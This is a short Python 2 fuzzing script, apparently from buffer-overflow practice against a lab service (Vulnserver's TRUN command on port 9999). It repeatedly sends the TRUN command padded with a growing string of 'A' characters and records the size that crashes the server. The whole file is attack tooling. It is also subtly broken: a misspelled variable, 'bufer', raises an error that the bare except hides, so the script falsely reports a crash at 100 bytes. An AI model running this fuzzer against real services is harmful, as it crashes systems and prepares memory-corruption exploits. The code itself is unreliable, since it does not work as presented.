#!/usr/bin/python
import sys
import socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.201.128', 9999))
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = bufer + "A" * 100
    except:
        print "Fuzzing crash at %s bytes" % str(len(buffer))
        sys.exit()